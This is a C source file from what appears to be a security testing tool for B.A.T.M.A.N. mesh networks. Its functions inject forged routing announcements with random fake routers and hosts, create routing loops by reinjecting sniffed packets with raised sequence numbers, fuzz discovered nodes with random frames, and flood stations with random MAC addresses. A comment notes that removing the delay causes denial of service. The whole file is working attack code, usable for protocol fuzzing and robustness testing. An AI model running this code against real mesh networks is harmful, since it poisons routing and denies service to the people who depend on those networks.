/*
 * Pedro Larbig, Alexander Oberle
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of version 3 of the GNU General Public
 * License as published by the Free Software Foundation.
 *
 * This program is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA
 * 02110-1301, USA
 *
 */

#include <time.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <string.h>

#include "tests.h"
#include "packets.h"
#include "mac_storage.h"

void fake_indirect_nodes(pcap_t *inject_here, u_char *localmac, int usleepinterval) {
  u_char *pkt;
  int len, i, hnac, extra;
  u_char randomstuff[42];
  time_t old = time(NULL);
  time_t new;
  int pkts=0, bytes=0, routers=0, hosts=0, pps=0;        //Statistic counters :)
  
  while(1) {
    for(i=0;i<42;i++) randomstuff[i] = (u_char) random();
    hnac = (random() % 5) + 1;
    
    pkt = create_packet(&len, localmac, 0, 0, 255, random(), randomstuff, randomstuff + 6, 48, hnac, randomstuff + 12);
    routers++;
    hosts += hnac;
    
    extra = random() % 26; //This is the max, so packets won't exceed 1500 bytes
    while (extra) {
      for(i=0;i<42;i++) randomstuff[i] = (u_char) random();
      hnac = (random() % 5) + 1;
      
      pkt = packet_append(pkt, &len, 0, 0, 254, random(), randomstuff, randomstuff + 6, 47, hnac, randomstuff + 12);
      routers++;
      hosts += hnac;
      
      extra--;
    }
    
#ifdef DEBUG
    printf("Created and Injecting: ");
    print_packetinfo(pkt, len);
#endif

    pkts++;
    pps++;
    bytes += len;

    pcap_inject(inject_here, pkt, len);

    free(pkt);
    usleep(usleepinterval);
    
    new = time(NULL);
    if (new != old) {
      printf("\rInjected: %d packets, %d bytes, %d routers, %d hosts, %d packets/sec                ", pkts, bytes, routers, hosts, pps);
      fflush(stdout);
      old = time(NULL);
      pps = 0;
    }
  }
}

void create_loops(pcap_t *inject_here, int time_tweak) {
  struct pcap_pkthdr header;
  const u_char *cpos, *pkt;
  u_char *inject;
  struct batman_packet *bp;
  int injlen;
  time_t old = time(NULL);
  time_t new;
  int pps = 0, pkts = 0, bytes = 0;

  while(1) {
    
    pkt = pcap_next(inject_here, &header);
    if (pkt == NULL) continue;
    
    if ((pkt[12] == 0x43) && (pkt[13] == 0x05)) {
    cpos = pkt + 14;        //Skip ethernet header
    while(cpos < (pkt + header.len)) {
      bp = (struct batman_packet *) cpos;
      switch (bp->packet_type) {
        case 0x01:
          if (! (bp->flags & 0x50)) {
            inject = create_packet(&injlen, pkt + 6, 0, 1, 255, ntohl(bp->seqno) + 3, bp->orig, bp->orig, 49, bp->num_hna, cpos + BATMAN_LEN);
            pcap_inject(inject_here, inject, injlen);
            free(inject);
            pkts++; pps++;
            bytes += injlen;
            usleep(time_tweak * 1000);
          }
          cpos = cpos + BATMAN_LEN + (6 * bp->num_hna);
        break;
        case 0x04: //BCast
        case 0x03: //Unicast
        default:
          //printf(" Unknown Packet Type: %d\n", bp->packet_type);
          cpos = pkt + header.len;
      }
    }
    
    new = time(NULL);
    if (new != old) {
      printf("\rInjected: %d packets, %d bytes, %d packets/sec                ", pkts, bytes, pps);
      fflush(stdout);
      old = time(NULL);
      pps = 0;
    }
  }
  }
}

void rfuzz_batman(pcap_t *pcap_handle, int sniff_time, u_char *ifmac) {
  const u_char *packet, *store;
  struct pcap_pkthdr header;
  struct batman_packet *bp;

  int sec = 0, msg_size, crap;
  unsigned long i = 0, len;
  int runtime = 1;
  time_t start = time(NULL);

  printf("\nSniffing %i seconds for MAC addresses.. \n\n", sniff_time);

  while(sec < sniff_time) {

    packet = pcap_next(pcap_handle, &header);
    if (packet == NULL) continue;

#ifdef DEBUG
    print_packetinfo(packet, header.len);
    printf("\n\n");
#endif

    if(packet[12] == 0x43 && packet[13] == 0x05) {
      bp = (struct batman_packet *) packet;
      store_add(bp->orig);
      store_add(packet);
      store_add(packet + 6);
    }

    sec = (int) time(NULL) - (int) start;
  }

  store = store_get_all(&len);
  printf("\n\nFound the following nodes:\n");
  for(i=0; i<len; i+=6){
    print_mac(store + i);
    printf("\n");
  }

  printf("\nWill send random packets to each found node (+broadcast)\n");
  printf("Starting to generate packets.. \n");
  sleep(1);

  while (1) {
    msg_size = (random() % 1486) + 14; //Minimum length: Ethernet header: ETH type BATMAN
    u_char *msg = malloc(msg_size);

    u_char *crapptr = msg;
    while((crapptr + 4) < (msg + msg_size)) {
      crap = random();
      memcpy(crapptr, &crap, 4);
      crapptr += 4;
    }
    
    while(crapptr < (msg + msg_size)) { 
      crapptr[0] = (u_char) random();
      crapptr++;
    }
    
    printf("\n/*** sending packet no. %i ***/\n\n", runtime);
    fflush(stdout);

    memcpy(msg, BROADCAST, 6);
    memcpy(msg+6, ifmac, 6);
    memcpy(msg+12, "\x43\x05", 2);
    
    bp = (struct batman_packet *) (msg + 14);
    
    if (msg_size > 14) bp->packet_type = 0x01;
    if (msg_size > 15) bp->version = BATMAN_VERSION;
    if (msg_size > 27) memcpy(bp->orig, store_get_random(), 6);
    if (msg_size > 33) memcpy(bp->prev_sender, store_get_random(), 6);

    //print_packetinfo(msg, msg_size); //If you wanna fuzz the joker, just uncomment ;)
    pcap_inject(pcap_handle, msg, msg_size);

    runtime++;
    free(msg);
    usleep(10000);
  }
}

// used by mutation fuzzing as well as STA flooding
void sniff_reinject_bpackets(pcap_t *pcap_handle, u_char *ifmac, int test) {
  const u_char *packet;
  u_char * mod_packet;
  struct pcap_pkthdr header;
  struct batman_packet *bp;
  const u_char *cpos;
  long rand_mac = 0;

  printf("\nSearching for packets to modify.. \n\n");
  if(test == 1)
          printf("method: mutation-based fuzzing\n");
  if(test == 2)
          printf("method: STA flooding\n");
  sleep(2);

  while(1) {

        packet = pcap_next(pcap_handle, &header);
        mod_packet = malloc(header.len);
        memcpy(mod_packet, packet, header.len);
        if (packet == NULL) continue;

        if ((packet[12] == 0x43) && (packet[13] == 0x05)) {
        //if(1) { // change with line above for batman

                //printf("received:\n");
                //print_packetinfo(packet, header.len);
                //printf("\n\nmodifying...\n\n");

                cpos = packet + 14;             //Skip ethernet header
                bp = (struct batman_packet *) cpos;

                switch(test) {

                        case 1:                // mutation-based fuzzing

                                //bp->packet_type = 0x01;  // no need to modify, others get dropped

                                //memcpy(bp->orig, "\x00\x00\x00\x00\x00\x00", 6); //

                                // Direct   => set: p->flags |= 0x10; get: (bp->flags & 0x40) >> 6)
                                // Firsthop => set: p->flags |= 0x40; get: (bp->flags & 0x10) >> 4)

                                //bp->flags = random() % 256; // random flags for 1 Byte
                                //bp->flags = 255;

                                // Quality
                                //bp->tq   = 20;

                                //memcpy(bp->prev_sender, "\x00\x00\x00\x00\x00\x00", 6);

                                //bp->ttl  = 255;

                                //bp->num_hna = 0;

                                //printf(" SeqNr: %d\n", ntohl(bp->seqno));
                                bp->seqno = htonl((ntohl(bp->seqno)+15));

                                /*
                                printf(" HNAs: ");
                                int i;
                                for (i=0; i<bp->num_hna; i++) {
                                print_mac(cpos + BATMAN_LEN + (6 * i));
                                printf(" ");
                                }
                                */
                        break;
                        case 2: // STA flooding
                                rand_mac = random();

                                memset(mod_packet+6, 0, 2); // if multicast we get a warning in the mac80211 stack
                                memcpy(mod_packet+8, &rand_mac, 6);
                        break;

                }
                pcap_inject(pcap_handle, mod_packet, header.len);
                printf("sending:\n");
                print_packetinfo(mod_packet, header.len);
                //usleep(500000); // without => DoS
        }

  } // end while

}
